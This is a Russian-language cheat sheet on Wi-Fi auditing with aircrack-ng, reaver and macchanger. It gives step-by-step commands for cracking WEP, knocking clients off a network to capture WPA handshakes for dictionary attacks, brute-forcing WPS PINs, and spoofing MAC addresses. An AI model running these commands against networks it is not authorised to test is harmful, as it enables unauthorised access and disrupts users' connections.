# Аудит Wi-Fi

Режимы работы Wi-Fi:

* Client mode (managed mode) - ловить только своё
* Monitor mode (rfmon mode) - ловить всё отовсюду
* Promiscuous mode - ловить всё в своей сети

Запуск монитора:

```bash
airmon-ng start wlan0
```

Отключить всех, кто использует сетевую карту:

```bash
airmon-ng check kill
```

Вывод на экран всего, что поймаем:

```bash
airodump-ng mon0
```


## airodump-ng

```bash
airodump-ng -c 3 mon0
```

зафиксировать канал №3 — полный приём пакетов без потерь при переключении на другие каналы (из-за перекрывающихся частот в список могут попасть соседние каналы).

```bash
airodump-ng -w captures.pcap mon0
```

записывать все принятые пакеты в файл captures.pcap — используется для offline-атаки на перебор пароля WEP/WPA (будет освещено в следующей части).

```bash
airodump-ng --essid "Имя сети" mon0
```

фильтровать принимаемые (записываемые/отображаемые) пакеты по принадлежности к заданному имени сети. Обычно используется для уменьшения размера файла, так как на качество перехвата это никак не влияет.

```bash
airodump-ng --bssid 01:02:03:AA:AA:FF mon0
```

фильтрация по MAC-адресу точки доступа (BSSID). Аналогично `--essid`.


## WEP

1. Поймать много-много пакетов
	1. Нацелить монитор на точку доступа
	    ```bash
		airodump-ng -c CHANNEL --bssid AP_BSSID -w output wlan0
		```
	2. Подружиться с точкой доступа
	    ```bash
		aireplay-ng -1 0 -e ESSID -a MAC_ТД -h НАШ_MAC wlan0
		```
	3. Создать паразитный трафик
	    ```bash
		aireplay-ng -3 -b MAC_ТД -h НАШ_MAC wlan0
		```
2. Перебор пароля
    ```bash
	aircrack-ng -z output*.cap
	```


## WPA/WPA2

1. Включить мониторинг пакетов
    ```bash
	airodump-ng -c CHANNEL --bssid AP_BSSID -w output mon0
    ```
2. Выкидываем клиента из сети и ловим handshake
    ```bash
	aireplay-ng --deauth 5 -0 CHANNEL -a AP_BSSID -c CLIENT_BSSID mon0
	```
3. Перебор по словарю
    ```bash
	aircrack-ng -w password.lst -b AP_BSSID output*.cap
	```


## WPS

Список сетей с WPS:

```bash
wash -i mon0
```

```bash
reaver -i mon0 -c CHANNEL -b AP_BSSID -va
```

Некоторые ключи:

```
-m OUR_MAC
-e AP_ESSID
-p PIN
-vv -- для показа принятых/переданных пакетов, в том числе тех самых M4 и M6. Полезно для отслеживания активности при плохом соединении.
```

## Смена MAC

```bash
ifconfig wlan0 down 
ifconfig wlan0 hw ether 00:11:22:AA:AA:AA 
ifconfig wlan0 up
```

Случайный MAC:

```bash
macchanger -r wlan0 
```

Определённый MAC:

```bash
macchanger -m 11:22:33:AA:BB:CC wlan0 
```

Показать MAC:

```bash
macchanger -s wlan0 
```

